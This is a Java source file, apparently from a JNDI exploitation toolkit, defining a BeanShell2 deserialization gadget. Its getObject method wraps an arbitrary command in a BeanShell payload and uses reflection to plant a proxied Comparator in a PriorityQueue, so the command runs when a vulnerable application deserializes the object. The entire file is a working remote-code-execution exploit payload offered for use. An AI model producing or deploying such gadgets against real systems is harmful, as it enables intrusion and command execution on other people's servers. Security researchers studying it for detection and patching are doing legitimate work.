package com.qi4l.jndi.gadgets;

import bsh.Interpreter;
import bsh.NameSpace;
import bsh.XThis;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.beanshell.BeanShellUtil;

import java.lang.reflect.*;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b1"})
@Authors({Authors.KILLER})
public class BeanShell2 implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
        String      payload = BeanShellUtil.makeBeanShellPayload(command);
        Interpreter i       = new Interpreter();

        Method setu = i.getClass().getDeclaredMethod("setu", String.class, Object.class);
        setu.setAccessible(true);
        setu.invoke(i, "bsh.cwd", ".");
        i.eval(payload);

        Class<?> xthis        = Class.forName("bsh.XThis");
        Field    handlerField = xthis.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        Constructor<?> xthisDeclaredConstructor = xthis.getDeclaredConstructor(NameSpace.class, Interpreter.class);
        xthisDeclaredConstructor.setAccessible(true);
        Object xt = xthisDeclaredConstructor.newInstance(i.getNameSpace(), i);
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerField.get(xt);

        Comparator<? super Object> comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
        PriorityQueue<Object>      queue      = new PriorityQueue(2);
        queue.add("1");
        queue.add("2");

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, comparator);
        return queue;
    }
}